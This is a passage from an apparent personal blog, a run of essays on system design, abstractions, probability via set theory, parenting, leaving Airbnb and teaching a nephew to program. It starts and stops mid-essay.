![](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzgwMDM4MjY3LTI0ODE5NDAwLTg0YWEtMTFlYS05MzUwLTkwYzIzYjA3MGYxOS5wbmc)

First time I've made a dish in 7 years

### Long Term

I think long term, we face two primary fears.

**The first, health: will we lose lives?** This is fundamentally up to
us. What we do to today will ultimately decide tomorrow. Physically
isolate, wash your hands, and stay safe. This is directly under our
control, so let's give ourselves completely to it.

**The second, wealth: will we enter a great depression?** We may feel
that the world will change and we won't keep up --- what if we lose our
wealth, lose our job, and our skills aren't relevant anymore? What if
we're not safe, never mind that we may never achieve our dreams?

Let's break this down.

**Kill the fear:** Even if you lose all our wealth, your job, and your
skills aren't relevant anymore, *you still have your wits*. The skills
you have today didn't just pop up when you were born. You learned them.
You *will* learn and adapt with whatever is next.

**Evolve the vision:** Instead of judging your future by outcome (how
much wealth you have), judge it by character: *what kind of person will
you be?* You *will* be the kind of person who generates value, who is
strengthened by adversity. Your character and your behavior is under
your control.

### Putting it together

Thinking about it, both the short term and the long term fall under one
idea: **focus on what you can control.** You can only control your
character and your actions. So focus on that, and judge yourself only by
that.

------------------------------------------------------------------------

*Thanks to Bipin Suresh, whose stoic ideas inspired the realization that
all of these actions fit under one umbrella.*

*Thanks to Jacky Wang and Luba Yudasina for convincing me to include my
personal story.*

*Thanks to Bipin Suresh, Victoria Chang, Luba Yudasina, Mark Shlick,
Jacky Wang, Aamir Patel, Nino Parunashvili, Daniel Woelfel, Avand Amiri,
Abraham Sorock for reviewing drafts of this essay*

\(1\) Black Swans: Rare events in certain domains, where their magnitude
is so large that in the long run they are all that matter. See Nassim
Taleb's
[Incerto](https://en.wikipedia.org/wiki/Nassim_Nicholas_Taleb#Incerto)
for the concept and some of the most profound essays on risk

\(2\) Amor Fati: "To love one's fate" --- from
[Nietzche](https://en.wikipedia.org/wiki/Amor_fati)

# Going multi-region

I recently shared a high level idea, on the infrastructure needed to
evolve a single-region system into a multi-region system. This is a bit
abstract, but I wanted to share this with you, to illustrate one of the
most important system design principles I employ: pushing complexity
down the stack.

So, say you want to move your system to a multi-region system. What
would you need to do to evolve that system?

### 1. You need a multi-region deploy train

In a service's configuration, the service owner should be able to write
regions they can deploy to

\[code\]

        {US-East, US-West, China, Sweden}

\[/code\]

Then, the deploy train should be able to deploy to all regions

To do this, you need deployment infrastructure which takes this
configuration and can reserve and update machines in all regions.

### 2. You need a multi-region DNS service

A service owner should be able to make a request out to another service,
by some url:

\[code\]

    curl service-b.internal-dns

\[/code\]

Once the request is made, the DNS service should find a machine that's
geographically closest to the origin request. It needs to be able to
handle failures, and find different machines if that is the case

To do this, you need infrastructure for service routing. This should be
a tool that lets a service owner associate specific machines to a route,
and allows them to set specific rules: things like default timeouts and
failover behaviors.

This infrastructure should come with a library available on all system
languages, which lets them send requests.

### 3. You need a distributed database

A service owner should be able to create tables and specify: where the
source of truth should live, privacy rules, and compliance rules. The
database should expose a friendly API that abstracts away how it fetches
the data, as well as how it determines privacy and compliance rules.

To do this, you first need to introduce a database like cassandra or
spanner. After that you likely also need to add an extra layer of
infrastructure on top, to abstract away privacy and compliance rules.

------------------------------------------------------------------------

If you have these three pieces of infrastructure, you can begin to
migrate leaf services with significant velocity. **A key thing to
notice: much of the leg work is done by infrastructure**.

Pushing complexity down the stack is what will allow you to scale your
organization. It can be easy to leave much of this complexity in the
product domain. If you do this, you will slow down every product
engineer, and force them to have enough context to make significant
system decisions for most changes. It will also leave your
infrastructure engineers scrambling to manage and maintain numerous
esoteric solutions, which were brought up in product land and now need
to be maintained. By managing most of the complexity with your
infrastructure, your product engineers can focus and maximize their
impact with product, and your infra engineers can maximize theirs by
empowering the whole company.

*Thanks to Daniel Woelfel for reviewing drafts of this essay*

# Hacker\'s Paradise

*Note: this essay tries to answer the question "What is the essence of
System Design, and how do you do it?". It covers broad strokes. At some
point I hope to go much deeper. Meanwhile, I hope you find this
enjoyable :)*

------------------------------------------------------------------------

What is a hacker's paradise?

My vote would be the beginning years of a startup.

The whole system fits in your head. All your problems are important, and
you can solve them any way you like. You're spinning clay while the
world is pouring concrete. If you love to create it's easy to see:
despite all the schleps of a startup, an environment with speed,
independence, and changeability is paradise.

### Elephant

But we know this doesn't last long. When those same startups become big,
most of them slow down to a crawl. Why is that?

In one of Rich Hickey's talks, he made a metaphor that could explain it.
Paraphrased, he said "Your system grows into an elephant. Every new
feature is you teaching it new tricks".

The larger and hairier the elephant, the harder it is to teach it
tricks. And, of course some tricks become off-limits: you can't teach an
elephant to do backflips.

So companies slow down because their systems get large and hairy. Is
that the only reason? I don't think so, but it is certainly one of the
biggest. An argument could be made for organizational issues: there's a
cost to lots of people working together. But systems grow exponentially
in size, so even if everyone agreed and they worked together perfectly,
I'd bet that system complexity would take a fair amount of the blame.

### System Design

Taming that elephant, I think, is the essence of system design. So how
do we *do s* ystem design?

A lot of complex ideas come to mind when we think about what's involved:
Robustness, performance, stability, safety, scale. These are all
important concepts, but I think they are not the central goal.

The central goal is much simpler. It's singular and defensive. Remember
that when we started, we already *had* a hacker's paradise, Our goal is
to hold the fort. To do this, just one idea encapsulates it all:
changeability. Changeability maximizes the impact an engineer can have
on your system, and at the end of the day it's those engineers who can
affect *any* improvement to your system. This means that robustness,
performance, stability, safety, scale, and all else are dependent on
changeability.

System design is then the constant answer to the question: "How can I
make my system as changeable as possible?". That's a simpler question,
but the answer is no less difficult. Note one more surprising bit about
it: we must answer this question differently over time. This means that
design is dependent on time and context. Your answer can be right if
applied at T0, but wrong if applied at T200.

### Guide

Now, if making our system as changeable as possible is our primary act,
how do we do it?

First, we'll need to start off with the *maximum level of
changeability.* Systems that are maximally changeable are as simple as
possible. A simple system is the system that solves a problem with the
minimum amount of specific concepts, in a way that keeps all these
concepts as decoupled as possible.

That implies a few things: we would want to choose the most powerful
language we can to solve our problem. This lets us use the most powerful
abstractions, which will allow us to keep the number of specific
concepts that define our program at a minimum. We would want to use
powerful, immutable data structures, which will help us keep our
abstractions concise and decoupled. It also means that we would want to
use the simplest infrastructure we need to solve our problem. Simpler
infrastructure allows us to avoid introducing concepts that aren't
needed to solve our problems. The same applies for the abstractions we
choose: we'd want to use the abstractions that best solve for our
specific use cases, rather than solve generally for potential future
usecases we don't have.

Note that if you follow these ideas, your initial system may look like a
toy. It certainly won't use kubernetes. Remember that system design is
context- dependent, and at this point in time this *is* the best
solution.

Now, we must iterate. At every step of the way, ask: what's slowing down
our productivity? Pick the highest impact issues and start to address
them. Privacy getting too hairy? Introduce an abstraction that
centralizes the complexity of privacy, and removes it from the realm of
product engineering. Site going down too much? Introduce infrastructure
for detection and debugging. Once that's not enough, consider incident
management systems.

The common theme here: centralize and push complexity down. You take
pieces of complexity that *every* engineer needs to deal with, and
create an interface they can use which abstracts the complexity away. As
you do that, you try to make that infrastructure accessible: this means
it's written in a place where every engineer can access, in a language
that every engineer can change. That will enable all engineers to use
your abstraction, while having the option to dive deeper.

The fact that system design is iterative has two importance
consequences.

The first is that you cannot escape technical debt. Because a solution
at T0 becomes more and more incorrect as context changes, you are
constantly accruing technical debt. Because of this, *there can be no
perfect system.* It's your job to constantly manage the tradeoff between
quality and debt, and this iterative cycle is your sword.

The second is that applying blanket solutions will lead to failure. As
you get more technical debt, you will invariably end up with a desire to
enforce a new paradigm on the system: microservices being the common one
today. Because a paradigm solves *multiple* general \* *issues, you
invariably introduce some concepts that don't* specifically *solve your
issues, and have their own tradeoffs. The solution is again to lean in
to the iterative model: apply* specific *solutions to* specific
*problems*.\*

### Debt

As you iterate, you'll constantly run into the struggle between accruing
and paying down debt: do you slow down your velocity *now* to improve
future changeability *later*? The context we work in is so complicated
that there can't be a simple formula here. But, like in most craft, we
can lean in rules of thumb.

The first problem comes when you are considering *introducing* new debt.
The key rule to consider here is the nature of the debt. Not all debt
are created equal --- some have higher interest. Let's compare two
examples to illustrate. The first involves introducing a staging
environment, or improving performance. This does not get appreciably
harder *later.* Compare that to knowingly introducing a data model
change, that you *know* you'll need to migrate later. This involves
significantly more incidental work: dual writes, backfills, shadow
testing, the whole schebang. Based on the nature of the debt and the
importance of your current commitments, you need to balance and make a
choice.

The second problem comes when you are considering *paying down* debt.
The key rule to consider here is pain. You already have a sense of the
debt that is either causing the biggest slow down, or is about too. It's
difficult to measure your success here, as if you do your job well, no
one will even feel the pain. Nevertheless this skill can be learned from
your mistakes. First fix what causes the most pain immediately. Then,
get better and better at pre- empting the largest amount of pain
earlier. That, granted is a lofty goal --- I have never worked at a
company where there wasn't at least one glaring way to make things a
magnitude better.

### Fin

So we come down to the central idea. To keep your hacker's paradise you
need to tame your system complexity elephant. To do that, you need to
keep your system as changeable as possible. To do that, you need to
start out with a simple system, and evolve it iteratively as you grow.
There's so much more I want to go deeper into, but that will have to
wait for another. I hope this gives you a good model to think with.

*Thanks to Mark Shlick, Jacky Wang, Daniel Woelfel, Irakli Popkhadze,
David Magaltadze, Irakli Safareli, for reviewing drafts of this essay*

# Why change

I recently watched a Georgian movie on Netflix. In case you're not
Georgian, this is like seeing your school on national television --- oh
wow, a Georgian movie on Netflix!

I watched it, and it was pretty heart warming. The mood overall in the
movie was perhaps skewed negative, but it definitely captured a slice of
life in Georgian culture. The ever-joking discussion, the love of
family, responsibility, and all of its' consequences.

I saw a moment in the movie that struck me, and I wanted to dig deeper.
In the beginning of the movie, you meet this family. The son is playing
video games, while the father walks over to a closet to grab something.
As he opens the closet door, a musical instrument falls out. Rushing, he
mutters "I spent all this money on you to practice this instrument, and
here it is, stuck in a closet".

I cracked a smile, because that is such a stereotypically Georgian
saying. Well, maybe it's common internationally too --- I could
certainly see a grandma in Taiwan saying the same thing.

It's innocuous, but I think this contributes to a dangerous lesson.

"Hey, I did this for you, I expect you to be doing something for me
now." When a child hears that, what do they take away from it?

They take away *guilt* --- their parents sacrificed for them, so now it
is their *responsibility* to play that instrument. They don't play for
fun, curiosity, personal interest, or drive anymore. Just painful, dry,
guilt and responsibility.

I can almost hear someone say --- "Well, why not? It *is* their
responsibility"

Compare a person driven by guilt, with a person driven by playful
obsession. For one every minute is drudgery, for the other it's flow.
Even if they achieve the same result, one of them will certainly have a
different experience. Responsibility has a place, but using it as your
main drive is playing life on hard mode.

I think one of the best things my parents did for me, was to not
pressure me unduly about going to University. In Georgian, the word for
"education" is "enlightenment", so I imagine how hard it was for them to
see their son "unenlightened". If they had just said "look what we did
for you, how dare you throw it all away", I am not sure I would have the
heart go with my path. Yet, they didn't say that --- they supported me,
and even sent me emergency western unions in China without too many
questions. They put a wind behind my sails with their belief, and that
allowed me to go deeper, and discover what's play for me, which is work
for most.

------------------------------------------------------------------------

*I wrote this essay, in reflection of Mother's day today*

# Sets and Probability

I've been a big fan of Nassim Taleb's Incerto. He wrote a series of
essays on life, where all the topics revolve around decision making
under uncertainty. I wanted to dig deeper on some of the more technical
concepts he alluded too, so last year I explored a few textbooks on
probability theory.

I was surprised with how elegant the field was. The most inspiring idea
to me was how the originators interpreted probability through set
theory. Not only is it a beautiful way to look at things, but by seeing
it this way, they could apply few axioms, leverage set theory, and
badabing badaboom they had a whole field's worth of discoveries.

I wanted to share with you an example from one of the textbooks, that
illustrated the power of seeing probability through this lens, and
demonstrated how you could begin deriving complex ideas from the
simplest kernel.

### Boxes and balls

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzgzMDUxODM5LTYwNThjZDgwLWEwMDMtMTFlYS04YjE0LWQ2ODhiZGY0Y2MwMC5wbmc)

Let's say you have 2 boxes. In Box 1, you have 99 red balls, and 1 white
ball. In Box 2, you have 99 white balls, and 1 red ball.

**You pick a box at random, then, you pick a ball from that box.**

### Question 1: What's the chance that you pick a red ball?

#### Memory

This can get a bit tough to reason about. There's a 50% chance you pick
Box 1. In Box 1, you have a 99% chance. If you picked Box 2, you have a
1% chance. How do we combine these probabilities together?

If you reason the way you were taught in high school, you may think like
this:

Well, there's a 50% chance I pick Box 1, and a 99% chance after that to
pick a red ball And, there's a 50% chance I pick Box 2, and a 1% chance
after that to pick a white ball.

So the total probability can be `50% * 99% + 50% * 1%`

Which is 49.5% + 0.5% which is...50%

Now this will work, but notice how the probability was 50% --- Did you
really need to do all that work to figure this out? (1)

#### Intuition

Let's reimagine what *probability* here means. First, let's consider:
what are *all* *the possible outcomes*?

For out experiment, an outcome must contain two choices: The box we
chose, and the ball we chose after that. We could represent it like
this:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzgzMDUxODc0LTZlYTZlOTgwLWEwMDMtMTFlYS05YTNlLTA1MjEyY2MxM2M2OC5wbmc)

This is *one outcome --- we picked Box 1, then picked Red Ball 1.*

How many of these outcomes do we have?

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzgzMDUxOTE2LTdiYzNkODgwLWEwMDMtMTFlYS05ZTU0LWE0ZWQzNzVhOTBkMS5wbmc)

We can list it out: we pick Box 1, Red Ball 1, Box 1...Red Ball 99, etc.
In total, we would have 200 possible outcomes.

Now that we have all the outcomes in mind, we can answer the question:
*what's the probability that we pick a red ball?*

Well, how many outcomes contain a "red ball"?

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzgzMDUxOTYwLTg4NDgzMTAwLWEwMDMtMTFlYS05NjVhLTczNGJiNjRlMDE3ZC5wbmc)

Looks like 100. This means that 100 of 200 outcomes would give us the
result "we got a red ball" --- 100/200 makes 50%

Note how this boiled down to just "counting" the outcomes we cared
about. Is it really that easy? Let's try with a harder example.

### Question 2: You picked a red ball, what's the probability that it came

*from* Box 1?

#### Memory

This question can get pretty hairy to answer from what we learned in
high school. *Given* that we chose a red ball, what's the chance that it
was Box 1? Well, there are 99 red balls in Box 1, and only 1 red ball in
Box 2, so the chance that it came from Box 1 is *very high.* But how
high?

We may recall Bayes Theorem here, but the formula can be hard to
remember.

#### Intuition

However, if we think in sets, we can *kind of* derive Bayes Theorem.
Let's look at our outcomes again:

![](https://stopa.io/api/image/aHR0cHM6Ly9wYXBlci1hdHRhY2htZW50cy5kcm9wYm94LmNvbS9zX0RERUJEQUI4NDM4RTBDRTI1QkUzNjUyNDEyQ0NDNkE4NENCMEE2OTBBQjlFMTBGMzFFMzE0NENCRTE5NjJGOURfMTU5MDUyODI4MDUzNF9pbWFnZS5wbmc)

How many of these outcomes contain "red ball"?

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzgzMDUyMTQ1LWJkZWQxYTAwLWEwMDMtMTFlYS04NGU3LTVlNDIzNzQ3N2VjNi5wbmc)

Yup, 100 total. Since we *know* we got a red ball, this means that we
could have *only gotten* one of these 100 outcomes.

Out of these outcomes, how many come from "Box 1"?

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzgzMDUyMTcyLWM2ZGRlYjgwLWEwMDMtMTFlYS04MTU3LTg0YWVjMjA4YTBlZi5wbmc)

That\'s 99 outcomes. So out of 100 outcomes that could have happened, 99
of those came from Box 1. 99/100 and you have a 99% chance that given a
red ball, it came from Box 1.

This too, just came down to counting the number of outcomes. Now, it can
get a lot more difficult --- what if you can't possibly count the number
of outcomes? what if each outcome has a different probability? But, just
from this notion of events forming a set of possible outcomes, we can
chug along and derive out quite a bit.

\(1\) Alexandre came up with a pretty beautiful intuitive solution to
question 1: consider symmetry --- since the problem is symmetric (you
can reverse white and red), it implies the only solution could be 50%

*Thanks to Daniel Woelfel, Alexandre Lebrun, Bipin Suresh, Mark Shlick,
Davit Magaltadze for reviewing drafts of this essay*

# Thank you Airbnb

Time has come for Joe and I to embark on a new startup adventure. Below
is a portion of the note I left at Airbnb \-- thought I would share with
you : )

------------------------------------------------------------------------

It started from the interviews. I met Joe Lencioni and instead of
questions I experienced a conversation with a friend. I met Bipin
Suresh, and I could sense how he cared about people, and how he saw me
as an individual. With every conversation: Yvonne Luo, Christian
Deonier, Darrick Brown, Ian Myers, I was more and more convinced that
Airbnb lived and breathed belonging. Heck, I mentioned in one of the
interviews that we liked martial arts. A few days later, a package
arrived with a martial arts bag and a Muai Thai guidebook. Thank you
Christian!

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzg1MDY5ODg2LWI1ZWI0YTgwLWIxNjktMTFlYS04MWY1LTMyNTc4MDA5NzU4My5wbmc)

(still have it!)

I can't stress enough how lucky I was to have Bipin as my manager: From
India to infrastructure, he encouraged me to run with big problems, and
was always there when I needed support.

It's easy to say a company is cohesive, but one way to tell for sure:
build something that isn't on anyone's roadmap. Do people take the time
to help on their own accord? From air/land to awedience, I continue to
be astounded with our people. As I write this, so many memories pour
through:

I'll remember my walks with Alex Liu very fondly --- ever since I met
him I knew he was a force of nature. I'll remember hacking with Eric
Ning on projects --- anytime he joined, it felt like a strong breeze of
helpfulness entered the room. I'll remember having a deep conversation
with Steven Campbell on...file structure...and coming to some great
lessons at the end of it! With every 1:1 with Christian Deonier, I felt
like we skipped the formalities and went into the meaning of life. I'll
remember how Lucius DiPhillips led by example and took responsibility
during our 1:1s, and how he encouraged me. I'll remember how authentic
and true Gary Leung was, and how he welcomed me. I'll remember my walks
with Yvonne, my intense talk with Yohannes Tsegay. I'll remember my
talks with Michel: not only did hear me out on some of my more radical
technical ideas, but we even got into cooking. I'll remember pebs and my
talks with Jessie Li. I'll remember working with Brie Bunge --- we are
lucky as heck to have her. I'll remember how caring and proactive Jenny
Pushkarskaya was --- how she included me despite my unconscious push
backs. I'll remember how inspired I was with Emily Cheng --- she was so
authentic and bigger than life. I'll remember my talks with Marty,
Raghavan, Chuqian, Claire, Mengfei, Musaab, Xianxin, Yansen. I'll
remember werewolf with our teams. I'll remember hookah with Dragos and
Jon.

I'll remember how fun it was to work with Greg Szorc, Sean Abrahams,
Joel Snyder, and Janusz Kudelka on launching air/land. I'll remember how
Mohsen Amiri spent time helping me with kube, how Mike Fowler spent time
reviewing our code, and how darn cool Christian W. was. I'll remember
the many threads on slack that turned into projects. I'll remember
Vaithi Sundaram and how enthusiastic he was. I'll remember all the crazy
ideas --- live music for the bathrooms could still work, once we're back
from quarantine. I'll remember our functional programming community, and
learners. I'll remember the promise Calvin gave me about the cigars.
I'll remember working with Avand Amiri --- he is a true visionary with a
heart of gold. I'll remember hacking with Samuel --- he makes every
project move 10x faster. I'll remember payments incidents, where we all
got together. I'll remember meetings with Amy Gurka and Lesar Stepputat
that felt more like hangouts.

One thing I'll never forget: how we acted in our time of crisis. Brian
and the executive team led with a care and transparency that taught me
much. I was flooded with emotion with how our community reacted: I'll
never forget the [\[email protected\]](/cdn-cgi/l/email-protection) belo
on awedience, the goodbyes people said, the ideas people came up with,
and how proactive to help everyone was.

Another memory I'll never forget: going to an Airbnb experience...and
meeting Brian Chesky there. When your CEO goes to Airbnb experiences on
the weekend, and stays after to listen to the host, you know you're at
the right place. (I was wearing a red tracksuit and a gold chain ---
definitely did not expect him there). Joe and I told him then, that we
planned to start a company. He said he hoped that what we learned at
Airbnb would be helpful to us --- that a part of Airbnb's DNA would be
with us in the new company. That's more true than ever.

The time has come for Joe and I to take that step, and I feel the Airbnb
DNA coming with me. It's bittersweet to leave, but the bug to start a
company has only intensified, and we feel in our bones that now is the
time.

This company is filled with people with the heart of gold, and this
shines through in every interaction. I believe more than ever in the
mission we have, and I believe in you. If there's some advice could
leave to you, this is what I would say:

Tinker, play, make friends. The best ideas come when you're working on
hard problems. Learn to listen to those ideas --- it can be daunting to
try to build them out --- that maybe you're not an expert yet, or it's
not supposed to be done this way --- but I encourage you to experiment
and see what happens: you'll be surprised with the journey that unfolds.

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzg1MDY4ODY5LWZjZDg0MDgwLWIxNjctMTFlYS04MzJkLTE1MzYxMzc1MDUwNS5wbmc)

# Assessing Abstractions

Some abstractions are ticking time bombs, while others help you move
fast. How can you tell? What follows is my personal exploration for how
I assess abstractions.

### Problem

We add abstractions in our programs to solve problems. So, let's start
with the fundamental value proposition: what problem does our
abstraction solve?

Let's take a look at one example abstraction:

\[code\]

    NLP.parse(...) // => { intent: "set_alarm", at: "1593538633430" }

\[/code\]

This could be a natural language processing abstraction, which lets us
take a piece of text, and extract meaning from it. The inherent problem
of natural language processing is pretty darn complex, so an abstraction
that helps us solve it would be very valuable. This is a sign of a good
abstraction.

Now let's compare that to

\[code\]

    StringSplitter.easySplit(str, splitStr)

\[/code\]

Maybe this abstraction, adds a light layer on top of string.split. For
example, it may make it so you don't have to worry about regexes, and
can turn common string patterns into regexes. The value of a
`StringSplitter` abstraction is pretty darn low. Maybe `StringSplitter`
treats `splitStr` in a way that's a bit more in-line with the someone's
thinking, but at the end of the day this boils down to an indirection.

This leads us to the first principle. The more complex the problem it
solves for you, the better the abstraction (1).

### Interface

After we're convinced that the abstraction we are about to add solves a
tough problem for us, the next thing to consider is the interface: *how*
do we interact with the abstraction? Imagine if `NLP.parse` was called
like this:

\[code\]

    NLP.parse(lang, text)

\[/code\]

This is a great interface. It's small. We don't need to understand any
internals. For the main use-case, all we need to do is to provide
language and text. Compare that with

\[code\]

    NLP.parse(
      text,
      lang, 
      strategy,
      shouldUseFlagA,
      ...
      shouldUseFlagZ
    )

\[/code\]

In order to use this version, we'd need to deeply understand the
internals of NLP.parse. This lowers the value of the abstraction,
because we need to do more work to solve the same level of complexity.

This leads us to the second principle: **great abstractions have small
interfaces.**

### Breakthrough Cost

Now that we have an abstraction with a simple interface that solves a
hard problem, we need to ask a possibly fatal question: what happens
when we need to break through the abstraction?

All abstractions are leaky at some point. What will happen when you need
the abstraction to behave differently? What will happen when it doesn't
work as you expect?

For example, for `NLP.parse(lang, text)`, what if we needed to sort and
score the results differently? What if there's a bug, and we aren't
getting the entity we expect, can we look through and debug?

Understanding the answer to this, will give us the breakthrough cost. To
do this, we need to peak through the code. How is `NLP.parse`
implemented?

\[code\]

    parse(lang, text) { 
      return format(scoreEntities(fetchEntities(lang, text)))
    }

\[/code\]

In one solution, it could be composed of other abstractions that we can
take advantage of. This is a great sign, because we can reuse the
underlying abstractions in cases where we need to do something more
complicated. Compare that to

\[code\]

    parse(lang, text) { 
      internalParse(lang, text, flagA, flagB, ...flagZ)
    }

\[/code\]

This feels more dangerous. If these flags all head to the same function,
it's a sign that a bunch of different features are complected together.
It's also worrying: what if one of these flags don't do what you want?
you may have to fork the abstraction.

This leads us to the third principle: **great abstractions are
transparent.** I think this principle is the most overlooked. It's easy
to take the productivity win upfront, but if the abstraction you add
can't be changed, and can't be introspected, it's very likely to bite
you at some point.

### Generality

The final principle is orthogonal to the last three, but maybe it's the
most important. Hardy said *there is no permanent place in the world for
ugly mathematics ---* So it is with abstractions. The beauty in math
relates to how "general" and "tight" the solution is. I think this
parallels well with abstractions.

If you use an abstraction that is "essentially" simpler, it's more
likely to last, and it's likely to be more powerful.

Consider if the abstraction for `NLP`, was made up of specific
algorithms, *just* for natural language processing. This would still be
very valuable, but what would be *even more* valuable, is if the
abstractions that this library was composed of was more general: if the
parts that compose it were deep learning abstractions, you could reuse
them for other problems.

### Fin

And we reach the end. To pick great abstractions: pick the ones that
solve a complex problem for you. Make sure they have a simple interface,
and take a look at the internals, so you're confident you can jig things
up if needed. The more general and simple you can get for the same
amount of power, the better.

Want to see some great abstractions in the wild? First, chances are you
are using many of them: TCP, higher order functions like map & filter,
React. Some you may not have explored: Go's CSP, Rich Hickey's Datomic,
or his `seq` abstraction in Clojure. As you pick up abstractions, I
encourage you to run each one as an experiment: ask yourself at the end
how things went, discuss them with your friends, and soon you'll develop
a much more nuanced taste.

\(1\) The rabbit hole gets deeper. Even if an abstraction solves a
complex problem you have, you may need to take a step back and also ask:
why do I have this problem? For example, kubernetes may be a great
solution to building distributed systems, but why do you have a
distributed systems problem? Many times the problem itself can be
avoided. For the answer to that, [Hacker's
Paradise](https://stopa.io/post/241) tries to covers it.

*Thanks to Alex Reichert, Daniel Woelfel, Martin Raison, Sean Grove for
reviewing drafts of this essay*

# The Hacker Way: How I taught my nephew to program

Over the last year, my 13 year old nephew developed a love for hacking.
From [anime chat](https://anime-theory.web.app/), to
[snake](https://snake-a2aef.web.app/), a [minimal
twitter](https://ilia-%20python-tweet.herokuapp.com/), a
[blog](https://ilias-blog.web.app/), to an [anime music
startup](https://twitter.com/stopachka/status/1289945194411036675), he's
built some cool stuff (1). What I'm most proud of though, is that he's
done this with self directed play, rather than with a rigid curriculum.

To help him do this, I acted as a yoda in the background. I experimented
with a personal teaching philosophy, and I wanted to share the core
tenets with you --- I call it "The Hacker Way":

### Principle A: Learning is Play

Kids are taught to associate learning with responsibility. Learning is
stuff you don't want to do, but have to because it's either good for you
or will make your parents happy --- sort of like broccoli. With a belief
like this, both the kid and the teacher are playing life on hard mode.
The kid will lean towards the bare minimum. They won't have any desire
to self-direct and look deeper. The teacher has to constantly push the
student along.

This method is disastrous for mastery. Mastery requires depth, and you'd
need a kid with incredible self-disciple, and a teacher with an
incredible amount of time, to reach the kind of depth mastery demands.
Imagine the alternative: what if the kid was genuinely interested? All
of a sudden, learning is play, and depth is exploration.

My primary goal throughout every one of our conversations was to help
him cement this view: learning is play. So, how do we do that?

### Principle B: Meet them at their interests

Well one of the key differences between play and work is freedom: play
happens when you're doing what you want to be doing. This means, you
need to make sure that the kid is working on what they're *actually*
interested in. Even though you know, that if they just hung on for some
time, they'd learn to love it, it's more harm than good: it's unlikely
they'll persevere and regardless they'll remember the pain.

The solution to the problem is to meet them where they're at, and guide
them from there. For example, say you want to get a kid to read books.
Well, if they like cartoons now, what if you suggested anime? (japanese
tv shows). If they love the anime they'll soon discover manga (japanese
comic books). Once they read a bunch of manga, all of a sudden reading
is something they like to do. What if you threw in some adventure novels
after that, like Dune? Slowly but surely they're on the road to
voracious reading.

The key idea to notice, is that we expect kids to grok ideas that are
several steps away from their development. If you observe what they're
interested in right now, *then* form a plan from there, it's going to be
a lot more smooth. This requires patience, but that is the reality of
things.

For my nephew, programming started out as drawing. I knew he liked to
draw. He began designing apps with paper and pencil. So I got him
sketch. and sat him down one day to show him the basics. He was into
youtube, so he started designing banners. With that, he had a joyous
entry point.

So, it was smooth sailing from there, they saw that work was play?

### Principle C: Let kids drop things

Not quite. The other difference between play and work, is that you can
stop playing any time. It's common amongst older folks to teach a kid
something --- especially if they pay for some item --- and then expect
that the kid will devote themselves seriously to it.

This of course, is never the case. Kids don't know what they want and
they certainly don't have large attention spans. The common adult
reaction is to guilt trip the kid --- you said you wanted this, and now
it's collecting dust. The ostensible purpose is to teach a kid the value
of a dollar, but I don't think this is what actually happens. Instead,
they learn to avoid taking risks. They may force themselves to continue
on with that activity too, which teaches them to dislike learning.

What if you encouraged the opposite? Any time you gave a gift, you said:
hey, if at any point this becomes boring, *promise me to stop and do
something else*. All of a sudden the pressure is gone. They can explore
at their leisure, discover more of what they like, and it becomes
natural to come back to things.

I did just this. With books, every time I suggested something, I told
him to only read when he felt like it, and to stop and do something else
as soon as he was bored. Lo and behold, he finished more books than I
could have imagined, and started to form his own taste.

With programming, after the youtube design, he had a bit of a lull,
where he focused on other things. Eventually though, curiosity and
desire rose in him again: how could he make these designs *real*? How
could he make *real* websites?

At this point, the desire was hot, and it was time to transform it
forward. We can teach them something now. But how?

### Principle D: Treat kids like junior apprentices

We teach kids in two common ways. The first is to form a "classical"
environment: you start from first principles, and guide them through the
fundamentals: what is a string, what is an array, etc. This is often the
most boring approach --- if a kid doesn't understand why they need to
learn something, it's much harder to learn it.

The second is to form a "kid-size" environment: maybe a dummy
programming language that works on kid-style problems. This may be
better than the classical approach, but I think it still suffers from
similar problems: the kid doesn't really understand *why* they're doing
this. Most game-like tools are less fun than real games too, so if they
see this strictly as games...there are much better options. (2)

An alternative method is to treat them with a bit more respect. What if
you treated them like an intern? Imagine how a kid would feel if they
worked on what the *pro adults did.* It's intriguing, and it may even be
something their friends think is cool.

My working approach is to do just that and treat them like junior
apprentices. They get the same tools as adults: but like all
apprentices, they need to start by learning subsets first. For
programming, I started by showing him how to make a simple site with
HTML and CSS. Just the basics --- enough for him to make something.

With HTML & CSS he built a personal news site, a blog, a tic tac toe
board, and started doing his school projects as websites. He saw how
this really did *feel* like the real thing --- it spiked his imagination
and got him exploring further.

Note, that like most apprentices, he did the majority of the research
and work: I simply gave the problems, and was available for video calls
when he got stuck. Those video calls were import though: Like a real
apprentice I made sure to treat his questions seriously, and gave him
answers that satisfied his curiosity. This also let me figure out what
kind of project he could find interesting next. The work itself was up
to him.

Eventually, he wanted to make the news site do dynamic things: How can
you hide and show content? How can you make buttons work? Well, time to
learn a little bit of javascript. There's a valley here --- he may need
to understand strings now --- but he's built enough that he can probably
stomach a few videos on the fundamentals. With that, he's off to the
races --- until he decides to work on something else for a bit of course
🙂

### Fin

And that's my Hacker's Way. Instill in the idea that learning is play.
Meet the kid where they're at, let them explore, and treat them like a
junior apprentice.

### Aside: a curriculum

I didn't go too deep into the curriculum in the essay, because it
depends on the kid: where are they at, and what are they interested in
now? Nevertheless, to get a taste, here's a small subset of how his
exploration developed:

1.  Started off with Sketch. Made youtube banners, small site designs,
    etc
